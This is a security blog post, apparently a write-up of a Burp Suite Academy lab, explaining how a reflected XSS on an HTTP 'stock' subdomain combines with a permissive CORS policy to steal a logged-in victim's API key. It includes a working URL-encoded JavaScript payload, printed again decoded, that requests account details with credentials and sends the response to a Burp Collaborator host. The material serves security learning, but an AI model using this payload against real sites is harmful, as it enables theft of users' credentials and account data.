<!DOCTYPE html>
<html class="no-js" lang="en-us">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title>Exploiting XSS via CORS trust relationships - Fish Sec</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="Example test article that contains basic HTML elements for text formatting on the Web.">
	
	
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Nunito+Sans&display=swap">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">
	<link rel="stylesheet" href="/css/style.css">
	<link rel="stylesheet" href="/css/custom.css">
	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container">
		<div class="logo">
			<a class="logo__link" href="/" title="Fish Sec" rel="home">
				<div class="logo__title">Fish Sec</div>
				<div class="logo__tagline">All things security</div>
			</a>
		</div>
		
<nav class="menu">
	<button class="menu__btn" aria-haspopup="true" aria-expanded="false" tabindex="0">
		<span class="menu__btn-title" tabindex="-1">Menu</span>
	</button>
	<ul class="menu__list">
		<li class="menu__item">
			<a class="menu__link" href="/post/migrate-from-jekyll/">
				
				<span class="menu__text">Jekyll migration</span>
				
			</a>
		</li>
		<li class="menu__item">
			<a class="menu__link" href="/post/goisforlovers/">
				
				<span class="menu__text">(Hu)go Template Primer</span>
				
			</a>
		</li>
		<li class="menu__item">
			<a class="menu__link" href="/about/">
				
				<span class="menu__text">About Hugo</span>
				
			</a>
		</li>
		<li class="menu__item">
			<a class="menu__link" href="/post/hugoisforlovers/">
				
				<span class="menu__text">Getting Started with Hugo</span>
				
			</a>
		</li>
	</ul>
</nav>

	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">Exploiting XSS via CORS trust relationships</h1>
			<div class="post__meta meta">
<div class="meta__item-datetime meta__item">
	<svg class="meta__icon icon icon-time" width="16" height="14" viewBox="0 0 30 28"><path d="M15 0C7 0 1 6 1 14s6 14 14 14 14-6 14-14S23 0 15 0zm0 25C9 25 4 20 4 14S9 3 15 3s11 5 11 11-5 11-11 11zm1-18h-2v8.4l6.8 4.4L22 18l-6-3.8V7z"/></svg>
	<time class="meta__text" datetime="2018-04-16T00:00:00">April 16, 2018</time>
</div>

<div class="meta__item-categories meta__item">
	<svg class="meta__icon icon icon-category" width="16" height="16" viewBox="0 0 16 16"><path d="m7 2l1 2h8v11h-16v-13z"/></svg>
	<span class="meta__text"><a class="meta__link" href="/categories/development/" rel="category">Development</a>
	</span>
</div></div>
		</header><div class="content post__content clearfix">
			<h1 id="exploiting-xss-via-cors-trust-relationships">Exploiting XSS via CORS trust relationships</h1>
<p>Continuing the Burp Suite Academy series. Today, we will go through CORS exploitations exercises&hellip;</p>
<p>The web application is the same online store which allows a user to log-in, change his e-mail address and retrieve his API key. This time around, the server only trusts requests originating from subdomains of the app.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#a6e22e">GET</span> /api/requestApiKey <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">&lt;instanceId&gt;.web-security-academy.net</span>
Origin<span style="color:#f92672">:</span> <span style="color:#ae81ff">https://subdomain.&lt;instanceId&gt;.web-security-academy.net</span>
Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">sessionid=...</span>
</code></pre></div><p>Response:</p>
<pre><code>HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://subdomain.&lt;instanceId&gt;.web-security-academy.net
Access-Control-Allow-Credentials: true
Content-Type: application/json
X-XSS-Protection: 0
Connection: close
Content-Length: 89

{
  &quot;username&quot;: &quot;******&quot;,
  &quot;email&quot;: &quot;&quot;,
  &quot;apikey&quot;: &quot;********************************&quot;
}
</code></pre><p>Further testing reveals that the server is configured to accept <strong>any protocol</strong> as long as the request comes from a subdomain of the main application <code>&lt;instanceId&gt;.web-security-academy.net</code>.</p>
<p>This version of the application has a new function which allows a user to check the remaining stock of a given item. The request looks like this:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#a6e22e">GET</span> /?productId=1&amp;storeId=1 <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">stock.&lt;instanceId&gt;.web-security-academy.net</span>
Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">...</span>
Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">...</span>
Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">...</span>
Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">...</span>
Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
</code></pre></div><p>The paramater <code>productId</code> is not validated nor sanitized, and is vulnerable to reflected Cross-site Scripting.</p>
<pre><code>HTTP/1.1 400 Bad Request
Content-Type: text/html; charset=utf-8
Set-Cookie: session=5t8SM9hnfSxy91QpvWQ4o7rPMK8pg05H; Secure; HttpOnly
X-XSS-Protection: 0
Connection: close
Content-Length: 76

&lt;h4&gt;ERROR&lt;/h4&gt;Invalid product ID: &lt;script&gt;alert(&quot;document.domain&quot;);&lt;/script&gt;
</code></pre><p>Since the <code>stock.&lt;...&gt;</code> subdomain is running on <code>HTTP</code> (not <code>HTTPs</code>), the <code>session</code> cookies will never be transmitted to the browser. Therefore, our XSS will not be able to retrieve any of those. Right now, the impact of the vulnerability seems quite limited. Except, it is not !</p>
<p>We saw earlier that the server is configured to pass session cookies for any (cross-origin) request coming from a subdomain of the app, <strong>regardless</strong> of the protocol.</p>
<pre><code>Access-Control-Allow-Origin: &lt;protocol&gt;://subdomain.&lt;instanceId&gt;.web-security-academy.net
Access-Control-Allow-Credentials: true
</code></pre><p>Therefore, it is possible for us to leverage this CORS (mis)configuration to bypass the limitations of Same Origin Policy (SOP) and retrieve the API key with a cross-origin request. Consider the following attack scenario:</p>
<ol>
<li>Attacker hosts a malicious file in a server of his control</li>
<li>Attacker send a link to his exploit to Victim (who is already logged-in the main app)</li>
<li>Victim accesses the link and is redirected to <code>stock.&lt;instanceId&gt;.web-security-academy.net</code></li>
<li>Victim's browser triggers the <code>rXSS</code> payload when rendering the page</li>
<li>Victim's browser requests his <code>apikey</code> on the main app. At this point, the <code>Origin</code> of this request will be a trusted subdomain with protocol <code>http</code>. Therefore the server CORS config will allow the request to go through</li>
<li>Victim's browser sends the <code>apikey</code> to the Attacker's server</li>
<li>Et voilà !</li>
</ol>
<p>This the the payload I used to solve the corresponding exercise in BS Academy. It follows the aforementioned steps one-by-one. You can use the exploit server provided in the lab and conveniently force the Victim to visit it. In reality, the last part would require a little bit of social-engineering :-).</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">script</span>&gt;
<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">burpInstanceUrl</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&lt;Your generated instance URL&gt;&#34;</span>;
<span style="color:#75715e">/* We URL-encode our payload to prevent any hiccups when the browser will attempt render and execute the reflected XSS */</span>
<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">xssPayload</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;%3c%73%63%72%69%70%74%3e%6c%65%74%20%78%68%72%20%3d%20%6e%65%77%20%58%4d%4c%48%74%74%70%52%65%71%75%65%73%74%28%29%3b%78%68%72%2e%6f%70%65%6e%28%22%47%45%54%22%2c%22%68%74%74%70%73%3a%2f%2f%61%63%65%35%31%66%63%39%31%65%65%32%36%32%65%33%38%30%62%32%35%31%38%65%30%30%62%63%30%30%64%31%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%61%63%63%6f%75%6e%74%44%65%74%61%69%6c%73%22%2c%74%72%75%65%29%3b%78%68%72%2e%77%69%74%68%43%72%65%64%65%6e%74%69%61%6c%73%3d%74%72%75%65%3b%78%68%72%2e%6f%6e%6c%6f%61%64%3d%72%65%71%4c%69%73%74%65%6e%65%72%3b%78%68%72%2e%73%65%6e%64%28%29%3b%66%75%6e%63%74%69%6f%6e%20%72%65%71%4c%69%73%74%65%6e%65%72%28%29%7b%6c%6f%63%61%74%69%6f%6e%3d%22%68%74%74%70%3a%2f%2f%74%64%61%6b%67%35%66%79%6b%78%62%38%72%6b%64%70%62%32%63%70%69%6b%61%6c%6a%63%70%36%64%76%2e%62%75%72%70%63%6f%6c%6c%61%62%6f%72%61%74%6f%72%2e%6e%65%74%2f%3f%22%2b%74%68%69%73%2e%72%65%73%70%6f%6e%73%65%54%65%78%74%3b%7d%3c%2f%73%63%72%69%70%74%3e&#34;</span>;
<span style="color:#75715e">/* Step 2: Leverage the reflected XSS vulnerability in the subdomain to make an AJAX call and recover the victim&#39;s API key */</span>
<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">trustedUrl</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`</span><span style="color:#e6db74">http://stock.</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">burpInstanceUrl</span><span style="color:#e6db74">}</span><span style="color:#e6db74">.web-security-academy.net/?productId=</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">xssPayload</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&amp;storeId=1</span><span style="color:#e6db74">`</span>;
<span style="color:#75715e">/*  Step 1: Redirect the victim to the subdomain whitelisted in CORS configuration */</span>
document.<span style="color:#a6e22e">location</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">trustedUrl</span>;
&lt;/<span style="color:#f92672">script</span>&gt;
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="color:#75715e">&lt;!--</span><span style="color:#75715e"> Decoded xssPayload </span><span style="color:#75715e">--&gt;</span>
&lt;<span style="color:#f92672">script</span>&gt;
  <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">xhr</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
  <span style="color:#a6e22e">xhr</span>.<span style="color:#a6e22e">open</span>(
    <span style="color:#e6db74">&#34;GET&#34;</span>,
    <span style="color:#e6db74">&#34;https://${your_instance_url}.web-security-academy.net/accountDetails&#34;</span>,
    <span style="color:#66d9ef">true</span>
  );
  <span style="color:#a6e22e">xhr</span>.<span style="color:#a6e22e">withCredentials</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
  <span style="color:#a6e22e">xhr</span>.<span style="color:#a6e22e">onload</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">reqListener</span>;
  <span style="color:#a6e22e">xhr</span>.<span style="color:#a6e22e">send</span>();
  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">reqListener</span>() {
    <span style="color:#a6e22e">location</span> <span style="color:#f92672">=</span>
      <span style="color:#e6db74">&#34;http://subdomain.burpcollaborator.net/?&#34;</span> <span style="color:#f92672">+</span>
      <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">responseText</span>;
  }
&lt;/<span style="color:#f92672">script</span>&gt;

</code></pre></div><p>Tags: #cors,#burp-suite-academy</p>
		</div>
		<footer class="post__footer">
			
<div class="post__tags tags clearfix">
	<svg class="tags__badge icon icon-tag" width="16" height="16" viewBox="0 0 32 32"><path d="M32 19c0 1-1 2-1 2L21 31s-1 1-2 1-2-1-2-1L2 16c-1-1-1.4-2-1.4-2S0 12.5 0 11V3C0 1.5.8.8.8.8S1.5 0 3 0h8c1.5 0 3 .6 3 .6S15 1 16 2l15 15s1 1 1 2zM7 10a3 3 0 1 0 0-6 3 3 0 0 0 0 6z"/></svg>
	<ul class="tags__list">
		<li class="tags__item"><a class="tags__link btn" href="/tags/html/" rel="tag">HTML</a></li>
		<li class="tags__item"><a class="tags__link btn" href="/tags/css/" rel="tag">CSS</a></li>
		<li class="tags__item"><a class="tags__link btn" href="/tags/basic-elements/" rel="tag">Basic Elements</a></li>
	</ul>
</div>
		</footer>
	</article>
</main>

<div class="authorbox clearfix">
	<figure class="authorbox__avatar">
		<img alt="Julien avatar" src="/img/avatar.png" class="avatar" height="90" width="90">
	</figure>
	<div class="authorbox__header">
		<span class="authorbox__name">About Julien</span>
	</div>
	<div class="authorbox__description">
		Julien is an avid learner, with a few years of experience in the fields of application security and penetration testing. Aside from computers, he is enthralled by the joys of rock-climbing and dancing.
	</div>
</div>

<nav class="post-nav flex">
	<div class="post-nav__item post-nav__item--prev">
		<a class="post-nav__link" href="/post/creating-a-new-theme/" rel="prev"><span class="post-nav__caption">«&thinsp;Previous</span><p class="post-nav__post-title">Creating a New Theme</p></a>
	</div>
	<div class="post-nav__item post-nav__item--next">
		<a class="post-nav__link" href="/post/basic-elements/" rel="next"><span class="post-nav__caption">Next&thinsp;»</span><p class="post-nav__post-title">Basic HTML Elements</p></a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2020 Fish Sec.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>
